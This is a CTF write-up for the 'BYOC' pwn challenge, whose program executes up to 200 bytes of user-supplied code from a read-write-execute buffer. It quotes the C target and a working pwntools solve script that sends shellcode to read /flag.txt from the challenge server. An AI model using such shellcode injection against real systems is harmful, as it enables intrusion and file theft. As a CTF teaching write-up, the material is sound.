---
title: "BYOC"
description: "\"Bring Your Own Code\" — BYOC's chall.c does exactly what its name promises: it mmaps 200 bytes as RWX, reads up to 200 attacker-controlled bytes into it, and calls it. No bug to find at…"
event: "nns"
category: "pwn"
categoryLabel: "Pwn"
tags: ["NNS CTF 2026","pwn"]
date: "2026-10-22"
teammate: false
source: "NNS/pwn/BYOC/pwn_byoc/writeup.md"
---

## Summary

"Bring Your Own Code" — BYOC's `chall.c` does exactly what its name promises: it `mmap`s 200 bytes as RWX, reads up to 200 attacker-controlled bytes into it, and calls it. No bug to find at all; the challenge is straightforward shellcode. The provided `solve.py` (in the `handout/` dir, but clearly a player's solve script — pwntools `remote` against the challenge host) sends a minimal open/read/write chain that cats `/flag.txt`.

## Files

- `handout/chall.c` — challenge source (cited).
- `handout/byoc` — the compiled challenge binary.
- `handout/solve.py` — the deployed solve script.
- `handout/README.md` — local-run instructions (`echo 'NNS{local}' | sudo tee /flag.txt; ./byoc`).

## Analysis

### The target

`chall.c` is ten lines:

```c
void *code = mmap(NULL, 200, PROT_READ | PROT_WRITE | PROT_EXEC,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

write(STDOUT_FILENO, "> ", 2);
read(STDIN_FILENO, code, 200);
((void (*)(void))code)();
```

The `> ` prompt is a plain `write` (not `printf`), so there is nothing to responsive-send against; you just write 200 bytes at most and the code executes. Since no length limit tighter than 200 is enforced, a short shellcode fits comfortably — `solve.py` even asserts `len(sc) <= 200` before sending.

### The solve

`solve.py` confirms it is a player script: it targets the challenge server, `byoc-491198b0d16c.chall.nnsc.tf:1337` over TLS, rather than containing challenge-side logic. Using pwntools' `shellcraft` templates for amd64:

```python
sc = asm(
    shellcraft.open("/flag.txt", 0, 0) +
    shellcraft.read("rax", "rsp", 100) +
    shellcraft.write(1, "rsp", 100) +
    shellcraft.exit(0)
)
```

Note the useful pwnlib idiom `shellcraft.read("rax", "rsp", 100)`: pwnlib's read stub accepts a register name for the fd argument, so the open syscall's return value in `rax` is used directly for the read fd. The stack pointer is reused as the destination buffer, so no register/clobber bookkeeping is needed, and `write(1, "rsp", 100)` echoes up to 100 flag bytes back before `exit(0)` keeps the connection from hanging. `io.recvall(timeout=3)` then sweezes everything the remote produces into a decoded output.

## Exploit

Full flow:

```python
io = remote("byoc-491198b0d16c.chall.nnsc.tf", 1337, ssl=True)
io.send(sc)
print(io.recvall(timeout=3).decode(errors="replace"))
```

The shellcode is a couple dozen bytes, under the 200-byte cap. No stack/heap corruption, no ROP — RWX is the whole "vulnerability".

## Flag

Flag: not recovered in the writeup. `solve.py` prints the server's read output rather than retaining its content.
